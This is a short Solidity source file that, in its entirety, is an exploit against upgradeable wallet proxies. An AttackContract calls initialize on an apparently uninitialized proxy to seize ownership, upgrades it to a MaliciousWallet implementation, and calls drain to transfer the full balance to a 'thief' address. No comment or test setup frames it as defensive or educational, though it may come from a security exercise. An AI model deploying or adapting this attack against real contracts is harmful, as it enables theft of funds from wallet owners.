// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUpgradeableWallet {
    function initialize(address _owner) external;
    function upgradeTo(address newImplementation) external;
}

interface IMaliciousWallet {
    function drain(address payable to) external;
}

contract MaliciousWallet {
    function drain(address payable to) external {
        to.transfer(address(this).balance);
    }

    receive() external payable {}
}

contract AttackContract {
    function attack(address proxy, address maliciousImpl, address payable thief) external {
        IUpgradeableWallet(proxy).initialize(address(this));
        IUpgradeableWallet(proxy).upgradeTo(maliciousImpl);
        IMaliciousWallet(proxy).drain(thief);
    }
}
